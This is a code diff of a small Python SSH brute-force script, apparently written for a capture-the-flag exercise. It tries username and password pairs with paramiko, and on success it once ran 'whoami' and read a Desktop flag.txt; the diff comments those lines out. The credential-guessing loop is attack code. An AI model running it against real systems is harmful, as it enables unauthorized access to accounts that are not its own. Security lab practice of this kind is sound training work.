@@ -22,12 +22,12 @@ for username in usernames:
             client.connect(hostname=host, port=port, password=password, username=username, timeout=3)
 
             print(f"Successful login of {username}:{password}")
-            stdin, stdout, stderr = client.exec_command('whoami')
-            logged_in_user = stdout.read().decode().strip()
-
-            flag_path = f"/home/{logged_in_user}/Desktop/flag.txt"
-            stdin, stdout, stderr = client.exec_command(f'cat {flag_path}')
-            print("Flag:", stdout.read().decode().strip())
+            #stdin, stdout, stderr = client.exec_command('whoami')
+            #logged_in_user = stdout.read().decode().strip()
+                                                                                    #This was used to verify access to the ssh client
+            #flag_path = f"/home/{logged_in_user}/Desktop/flag.txt"
+            #stdin, stdout, stderr = client.exec_command(f'cat {flag_path}')
+            #print("Flag:", stdout.read().decode().strip())
             client.close()
             exit()
         except paramiko.AuthenticationException:
@@ -41,6 +41,7 @@ for username in usernames:
             print("UnExpected Error Occurred: ",e)
 
 print("No Matching Credentials Found!")
+
 
 
 
